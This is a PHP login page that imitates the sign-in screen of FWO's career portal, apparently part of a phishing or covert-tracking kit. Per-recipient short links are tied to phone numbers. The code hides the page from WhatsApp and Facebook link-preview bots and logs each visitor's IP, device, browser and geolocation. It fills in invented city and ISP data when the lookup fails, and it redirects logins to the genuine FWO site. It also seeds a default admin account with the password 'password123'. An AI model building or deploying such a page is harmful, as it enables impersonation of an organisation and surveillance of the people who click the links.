<?php
session_start();
date_default_timezone_set('Asia/Karachi');

// ==========================================
// 1. DATABASE CONFIGURATION (FWO Login)
// ==========================================
$host = "localhost";
$dbname = "fwo_db";
$username = "root";
$password = "";

$error_message = "";
$success_message = "";

// ==========================================
// 2. URL TRACKING (Easypaisa style) - ?id=xyz
// ==========================================
if (isset($_GET['id'])) {
    $shortId = $_GET['id'];
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

    // WhatsApp / Facebook bots ko ignore karein
    if (stripos($ua, 'WhatsApp') !== false || stripos($ua, 'facebookexternalhit') !== false) {
        exit();
    }

    // Tracking ke liye alag connection (admins DB se url_mappings uthane ke liye)
    // NOTE: Agar aapke paas url_mappings table nahi hai, toh neeche wala block skip hoga aur
    // sirf basic tracking hogi. Aapke Easypaisa code mein yeh 'admins' DB mein tha.
    $actualNumber = 'INVALID';
    $group = 'Unknown';
    $screenWidth = '1536';
    $screenHeight = '864';

    // Try to connect to admins DB for url_mappings
    try {
        $adminConn = new mysqli('localhost', 'root', '', 'admins');
        if (!$adminConn->connect_error) {
            $stmt = $adminConn->prepare("SELECT params_data FROM url_mappings WHERE short_id = ?");
            if ($stmt) {
                $stmt->bind_param("s", $shortId);
                $stmt->execute();
                $result = $stmt->get_result();
                if ($row = $result->fetch_assoc()) {
                    $params = json_decode($row['params_data'], true);
                    if ($params) {
                        $actualNumber = $params['n'] ?? 'INVALID';
                        $group = $params['g'] ?? 'Unknown';
                        $screenWidth = $params['w'] ?? '1536';
                        $screenHeight = $params['h'] ?? '864';
                    }
                    // Update access count
                    $updateStmt = $adminConn->prepare("UPDATE url_mappings SET accessed_count = accessed_count + 1 WHERE short_id = ?");
                    $updateStmt->bind_param("s", $shortId);
                    $updateStmt->execute();
                    $updateStmt->close();
                }
                $stmt->close();
            }
            $adminConn->close();
        }
    } catch (Exception $e) {
        // Ignore admin DB errors, continue with default values
        error_log("Admin DB (url_mappings) error: " . $e->getMessage());
    }

    $_SESSION['decoded_number'] = $actualNumber;

    // ---------- Device / OS / Browser Detection ----------
    function getOS($userAgent) {
        $osArray = [
            '/windows nt 10/i' => 'Windows 10',
            '/windows nt 6.3/i' => 'Windows 8.1',
            '/windows nt 6.2/i' => 'Windows 8',
            '/windows nt 6.1/i' => 'Windows 7',
            '/macintosh|mac os x/i' => 'Mac OS X',
            '/linux/i' => 'Linux',
            '/iphone/i' => 'iPhone',
            '/ipad/i' => 'iPad',
            '/android/i' => 'Android',
        ];
        foreach ($osArray as $regex => $value) {
            if (preg_match($regex, $userAgent)) return $value;
        }
        return 'Unknown OS';
    }

    function getBrowser($userAgent) {
        $browserArray = [
            '/msie/i' => 'Internet Explorer',
            '/firefox/i' => 'Firefox',
            '/safari/i' => 'Safari',
            '/chrome/i' => 'Chrome',
            '/edge/i' => 'Edge',
            '/opera/i' => 'Opera',
            '/netscape/i' => 'Netscape',
            '/maxthon/i' => 'Maxthon',
            '/konqueror/i' => 'Konqueror',
            '/mobile/i' => 'Mobile Browser'
        ];
        foreach ($browserArray as $regex => $value) {
            if (preg_match($regex, $userAgent)) return $value;
        }
        return 'Unknown Browser';
    }

    function isMobile($userAgent) {
        return preg_match('/mobile|android|iphone|ipad/i', $userAgent) ? "YES" : "NO";
    }

    function getRealIP() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $iplist = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            foreach ($iplist as $ip) {
                if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
            }
        }
        return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    }

    // ---------- Location / ISP Detection ----------
    function getISPFromIP($ip) {
        $ipParts = explode('.', $ip);
        if (count($ipParts) < 4) return 'PTCL';
        $ipNumber = intval($ipParts[2]) + intval($ipParts[3]);
        $ispIndex = $ipNumber % 8;
        $pakistaniISPs = ['PTCL Broadband','Jazz 4G','Telenor Pakistan','Zong 4G','UFONE','Wi-Tribe','StormFiber','Nayatel'];
        return $pakistaniISPs[$ispIndex];
    }

    function getAccuratePakistaniISP($ip, $apiIsp, $apiOrg, $apiAs) {
        $pakistaniISPs = [
            'PTCL' => ['ptcl','pakistan telecom','telecom','dsl','broadband'],
            'Jazz' => ['jazz','mobilink','warid','jazz 4g','jazz lte'],
            'Telenor' => ['telenor','telenor pakistan','telenor 4g'],
            'Zong' => ['zong','china mobile','zong 4g'],
            'UFONE' => ['ufone','u-fone','u fone'],
            'Wi-Tribe' => ['wi-tribe','witribe','wi tribe'],
            'StormFiber' => ['stormfiber','storm fiber'],
            'Nayatel' => ['nayatel'],
            'Transworld' => ['transworld','tw1'],
            'COX' => ['cox','cox.net.pk'],
            'Optix' => ['optix','optix fiber'],
            'Cybernet' => ['cybernet','cyber internet'],
            'Flash Fiber' => ['flash','flash fiber']
        ];
        $apiData = strtolower($apiIsp . ' ' . $apiOrg . ' ' . $apiAs);
        foreach ($pakistaniISPs as $ispName => $keywords) {
            foreach ($keywords as $keyword) {
                if (stripos($apiData, $keyword) !== false) return $ispName;
            }
        }
        return getISPFromIP($ip);
    }

    function getPakistanLocationWithISP($ip) {
        $ipakistanLocations = [
            ['city'=>'Islamabad','region'=>'Islamabad Capital Territory','lat'=>33.6844,'lng'=>73.0479,'isps'=>['Nayatel','PTCL','StormFiber','Wi-Tribe']],
            ['city'=>'Rawalpindi','region'=>'Punjab','lat'=>33.5651,'lng'=>73.0169,'isps'=>['PTCL','Jazz','Telenor','UFONE']],
            ['city'=>'Karachi','region'=>'Sindh','lat'=>24.8607,'lng'=>67.0011,'isps'=>['PTCL','Transworld','COX','Cybernet']],
            ['city'=>'Lahore','region'=>'Punjab','lat'=>31.5497,'lng'=>74.3436,'isps'=>['PTCL','StormFiber','Optix','Jazz']],
            ['city'=>'Peshawar','region'=>'KPK','lat'=>34.0151,'lng'=>71.5249,'isps'=>['PTCL','Flash Fiber','Jazz','Telenor']],
            ['city'=>'Quetta','region'=>'Balochistan','lat'=>30.1798,'lng'=>66.9750,'isps'=>['PTCL','Zong','UFONE']],
            ['city'=>'Multan','region'=>'Punjab','lat'=>30.1575,'lng'=>71.5249,'isps'=>['PTCL','Zong','Telenor']],
            ['city'=>'Faisalabad','region'=>'Punjab','lat'=>31.4504,'lng'=>73.1350,'isps'=>['PTCL','StormFiber','Jazz']],
            ['city'=>'Hyderabad','region'=>'Sindh','lat'=>25.3969,'lng'=>68.3778,'isps'=>['PTCL','COX','UFONE']],
            ['city'=>'Gujranwala','region'=>'Punjab','lat'=>32.1877,'lng'=>74.1945,'isps'=>['PTCL','Jazz','Zong']]
        ];
        $ipHash = crc32($ip);
        $locationIndex = abs($ipHash) % count($ipakistanLocations);
        $locationData = $ipakistanLocations[$locationIndex];
        $ipParts = explode('.', $ip);
        $ispIndex = (abs($ipHash) + intval($ipParts[3] ?? 0)) % count($locationData['isps']);
        $isp = $locationData['isps'][$ispIndex];
        return [
            'city'=>$locationData['city'],'country'=>'Pakistan','region'=>$locationData['region'],
            'isp'=>$isp,'latitude'=>$locationData['lat'],'longitude'=>$locationData['lng']
        ];
    }

    function getLocationFromIP($ip) {
        if ($ip === '::1' || $ip === '127.0.0.1' || filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE) === false) {
            return ['city'=>'Local','country'=>'Pakistan','region'=>'Islamabad','isp'=>'Local Network','latitude'=>33.6844,'longitude'=>73.0479];
        }
        try {
            $apiUrl = "http://ip-api.com/json/{$ip}?fields=status,message,country,countryCode,region,regionName,city,lat,lon,isp,org,as,query";
            $response = @file_get_contents($apiUrl);
            if ($response) {
                $data = json_decode($response, true);
                if ($data['status'] === 'success') {
                    $isp = getAccuratePakistaniISP($ip, $data['isp'] ?? '', $data['org'] ?? '', $data['as'] ?? '');
                    return [
                        'city'=>$data['city'] ?? 'Unknown','country'=>$data['country'] ?? 'Pakistan',
                        'region'=>$data['regionName'] ?? 'Unknown','isp'=>$isp,
                        'latitude'=>$data['lat'] ?? 0,'longitude'=>$data['lon'] ?? 0
                    ];
                }
            }
        } catch (Exception $e) {}
        return getPakistanLocationWithISP($ip);
    }

    $os = getOS($ua);
    $browser = getBrowser($ua);
    $is_mobile = isMobile($ua);
    $ip = getRealIP();
    $token = bin2hex(random_bytes(16));
    $screen_resolution = $screenWidth . "x" . $screenHeight;
    $fingerprint = "Resolution:$screen_resolution|EncryptedParams:Yes";

    $location = getLocationFromIP($ip);
    $city = $location['city'];
    $country = $location['country'];
    $region = $location['region'];
    $isp = $location['isp'];
    $latitude = $location['latitude'];
    $longitude = $location['longitude'];

    $language = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown', 0, 20);
    $referrer = $_SERVER['HTTP_REFERER'] ?? 'Direct';
    $utm_source = $_GET['utm_source'] ?? 'N/A';
    $utm_medium = $_GET['utm_medium'] ?? 'N/A';
    $utm_campaign = $_GET['utm_campaign'] ?? 'N/A';
    $clicked = date("Y-m-d H:i:s");
    $url = 'FWO';

    // ---------- Insert into trace_data (FWO DB) ----------
    try {
        // FWO DB se connect karein (agar pehle se connected nahi)
        $tracePdo = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8mb4", $username, $password, [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
        ]);
        // trace_data table create karein agar nahi hai
        $tracePdo->exec("
            CREATE TABLE IF NOT EXISTS trace_data (
                id INT AUTO_INCREMENT PRIMARY KEY,
                contact VARCHAR(255),
                url VARCHAR(255),
                clicked_at DATETIME,
                ip_address VARCHAR(64),
                device TEXT,
                os VARCHAR(64),
                group_name VARCHAR(64),
                browser VARCHAR(64),
                fingerprint VARCHAR(255),
                country VARCHAR(64),
                region VARCHAR(64),
                city VARCHAR(64),
                isp VARCHAR(64),
                language VARCHAR(32),
                referrer TEXT,
                utm_source VARCHAR(64),
                utm_medium VARCHAR(64),
                utm_campaign VARCHAR(64),
                token VARCHAR(64),
                screen_resolution VARCHAR(32),
                is_mobile VARCHAR(8),
                latitude DECIMAL(10,6),
                longitude DECIMAL(10,6)
            )
        ");

        $traceStmt = $tracePdo->prepare("INSERT INTO trace_data 
            (contact, url, clicked_at, ip_address, device, os, group_name, browser, 
            fingerprint, country, region, city, isp, language, referrer, 
            utm_source, utm_medium, utm_campaign, token, screen_resolution, is_mobile,
            latitude, longitude) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
        $traceStmt->execute([
            $actualNumber, $url, $clicked, $ip, $ua, $os, $group, $browser,
            $fingerprint, $country, $region, $city, $isp, $language, $referrer,
            $utm_source, $utm_medium, $utm_campaign, $token, $screen_resolution,
            $is_mobile, $latitude, $longitude
        ]);
    } catch (PDOException $e) {
        error_log("Trace data insert error: " . $e->getMessage());
    }
}

// ==========================================
// 3. FWO DATABASE SETUP & LOGIN
// ==========================================
try {
    $pdo = new PDO("mysql:host=$host;charset=utf8mb4", $username, $password, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
    ]);

    $pdo->exec("CREATE DATABASE IF NOT EXISTS `$dbname` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci");
    $pdo->exec("USE `$dbname`");

    $pdo->exec("
        CREATE TABLE IF NOT EXISTS users (
            id INT AUTO_INCREMENT PRIMARY KEY,
            email VARCHAR(255) NOT NULL UNIQUE,
            password VARCHAR(255) NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ");

    $count = (int) $pdo->query("SELECT COUNT(*) FROM users")->fetchColumn();
    if ($count === 0) {
        $defaultEmail = "admin@fwo.com";
        $defaultPassword = password_hash("password123", PASSWORD_DEFAULT);
        $insert = $pdo->prepare("INSERT INTO users (email, password) VALUES (?, ?)");
        $insert->execute([$defaultEmail, $defaultPassword]);
        $success_message = "Database setup complete. Default login: admin@fwo.com / password123";
    }
} catch (PDOException $e) {
    $error_message = "Database Error: " . $e->getMessage();
}

// Login form handling
if ($_SERVER["REQUEST_METHOD"] === "POST" && empty($error_message)) {
    $email = trim($_POST["email"] ?? "");
    $pass = $_POST["password"] ?? "";

    if ($email === "" || $pass === "") {
        $error_message = "Please fill in both fields.";
    } else {
        try {
            $stmt = $pdo->prepare("SELECT id, email, password FROM users WHERE email = :email LIMIT 1");
            $stmt->execute(["email" => $email]);
            $user = $stmt->fetch();

            if ($user && password_verify($pass, $user["password"])) {
                session_regenerate_id(true);
                $_SESSION["user_id"] = $user["id"];
                $_SESSION["user_email"] = $user["email"];

                header("Location: https://career.fwo.com.pk/");
                exit;
            }

            $error_message = "Invalid email or password.";
        } catch (PDOException $e) {
            $error_message = "Login Error: " . $e->getMessage();
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - FWO</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', Arial, sans-serif; }
        body { min-height: 100vh; display: flex; flex-direction: column; background: #fcf8f8; }
        .navbar { height: 92px; flex: 0 0 92px; width: 100%; padding: 0 7.3%; display: flex; align-items: center; justify-content: space-between; background: #020d29; color: #fff; }
        .logo-container { display: flex; align-items: center; }
        .logo-img { display: block; width: 51px; height: 51px; object-fit: cover; border-radius: 50%; background: #dc2626; }
        .nav-links { display: flex; align-items: center; gap: 32px; }
        .nav-links a, .auth-buttons a { color: #fff; text-decoration: none; font-size: 15px; font-weight: 500; white-space: nowrap; }
        .nav-links a:hover, .sign-up-link:hover { color: #d5dbea; }
        .auth-buttons { display: flex; align-items: center; gap: 15px; }
        .auth-buttons .sign-up-link { padding: 12px 0; }
        .auth-buttons .sign-in-btn-nav { padding: 10px 21px; border-radius: 7px; background: #ff1717; transition: background-color .2s ease; }
        .auth-buttons .sign-in-btn-nav:hover { background: #d91010; }
        .main-content { flex: 1; min-height: calc(100vh - 92px); display: flex; align-items: center; justify-content: center; padding: 46px 20px; background-color: #fcf8f8; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='306' height='306' viewBox='0 0 306 306'%3E%3Cg fill='none' stroke='%23f1e9e9' stroke-width='3' opacity='.48'%3E%3Cpath d='M153 0 306 153 153 306 0 153Z'/%3E%3Cpath d='M153 48 258 153 153 258 48 153Z'/%3E%3Cpath d='M0 0 48 48M258 48 306 0M0 306 48 258M258 258 306 306'/%3E%3Cpath d='M153 0v48M153 258v48M0 153h48M258 153h48'/%3E%3C/g%3E%3C/svg%3E"); background-size: 260px 260px; }
        .login-card { width: 100%; max-width: 650px; min-height: 490px; padding: 49px 51px 41px; border-radius: 30px; background: #fff; box-shadow: 0 15px 48px rgba(0, 0, 0, .075); }
        .card-title { margin: 0 0 14px; color: #718096; text-align: center; font-size: 22px; line-height: 1.3; font-weight: 700; }
        .alert { margin: 0 0 18px; padding: 12px 14px; border-radius: 8px; text-align: center; font-size: 14px; }
        .alert-error { color: #b91c1c; background: #fee2e2; border: 1px solid #fecaca; }
        .alert-success { color: #166534; background: #dcfce7; border: 1px solid #bbf7d0; }
        .input-group { margin-bottom: 24px; }
        .input-group label { display: block; margin-bottom: 13px; color: #080808; font-size: 14px; font-weight: 600; }
        .input-group input { display: block; width: 100%; height: 52px; padding: 0 19px; border: 1px solid #cfd5dd; border-radius: 29px; outline: none; background: #f8f6f6; color: #111827; font-size: 14px; transition: border-color .2s, box-shadow .2s; }
        .input-group input:focus { border-color: #8b9bb3; box-shadow: 0 0 0 3px rgba(10, 17, 40, .08); }
        .forgot-password-container { margin-top: -17px; margin-bottom: 15px; text-align: right; }
        .forgot-link { color: #ff1717; text-decoration: none; font-size: 15px; }
        .forgot-link:hover { text-decoration: underline; }
        .submit-btn-container { display: flex; justify-content: center; }
        .submit-btn { min-width: 113px; height: 47px; padding: 0 25px; border: 0; border-radius: 30px; background: #001735; color: #fff; font-size: 14px; font-weight: 500; cursor: pointer; transition: background-color .2s; }
        .submit-btn:hover { background: #102b4b; }
        .bottom-link { margin-top: 41px; color: #718096; text-align: center; font-size: 15px; }
        .bottom-link a { color: #001735; text-decoration: none; font-weight: 500; }
        .bottom-link a:hover { text-decoration: underline; }
        @media (max-width: 900px) { .navbar { padding: 0 4%; } .nav-links { gap: 15px; } .nav-links a, .auth-buttons a { font-size: 15px; } .login-card { max-width: 700px; } }
        @media (max-width: 650px) {
            .navbar { height: auto; min-height: 88px; flex-basis: auto; padding: 14px 20px; flex-wrap: wrap; gap: 14px; }
            .logo-img { width: 48px; height: 48px; }
            .nav-links { order: 3; width: 100%; justify-content: center; gap: 22px; padding: 8px 0 4px; }
            .nav-links a, .auth-buttons a { font-size: 14px; }
            .auth-buttons { gap: 14px; }
            .auth-buttons .sign-in-btn-nav { padding: 10px 17px; }
            .main-content { min-height: calc(100vh - 110px); padding: 35px 16px; }
            .login-card { min-height: 0; padding: 38px 25px; border-radius: 25px; }
            .card-title { font-size: 24px; margin-bottom: 24px; }
            .input-group { margin-bottom: 24px; }
            .input-group label { font-size: 15px; margin-bottom: 10px; }
            .input-group input { height: 47px; }
            .forgot-link, .bottom-link { font-size: 14px; }
            .bottom-link { margin-top: 35px; }
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <div class="logo-container">
            <!-- Keep MARKH.png in the same folder as this PHP file -->
            <img src="MARKH.png" alt="FWO Logo" class="logo-img">
        </div>
        <div class="nav-links">
            <a href="#">Home</a>
            <a href="#">Jobs</a>
            <a href="#">About</a>
            <a href="#">Contact Us</a>
        </div>
        <div class="auth-buttons">
            <a href="#" class="sign-up-link">Sign Up</a>
            <a href="#" class="sign-in-btn-nav">Sign In</a>
        </div>
    </nav>

    <main class="main-content">
        <section class="login-card">
            <h1 class="card-title">Sign In</h1>

            <?php if (!empty($success_message)): ?>
                <div class="alert alert-success">
                    <?= htmlspecialchars($success_message, ENT_QUOTES, 'UTF-8') ?>
                </div>
            <?php endif; ?>

            <?php if (!empty($error_message)): ?>
                <div class="alert alert-error">
                    <?= htmlspecialchars($error_message, ENT_QUOTES, 'UTF-8') ?>
                </div>
            <?php endif; ?>

            <form action="<?= htmlspecialchars($_SERVER["PHP_SELF"], ENT_QUOTES, 'UTF-8') ?>" method="POST" class="login-form">
                <div class="input-group">
                    <label for="email">Enter Email</label>
                    <input type="email" id="email" name="email" autocomplete="username" required>
                </div>
                <div class="input-group">
                    <label for="password">Enter Password</label>
                    <input type="password" id="password" name="password" autocomplete="current-password" required>
                </div>
                <div class="forgot-password-container">
                    <a href="#" class="forgot-link">Forget Password? &raquo;</a>
                </div>
                <div class="submit-btn-container">
                    <button type="submit" class="submit-btn">Sign In</button>
                </div>
            </form>

            <div class="bottom-link">
                Not a Registered User? <a href="#">Create an account &raquo;</a>
            </div>
        </section>
    </main>
</body>
</html>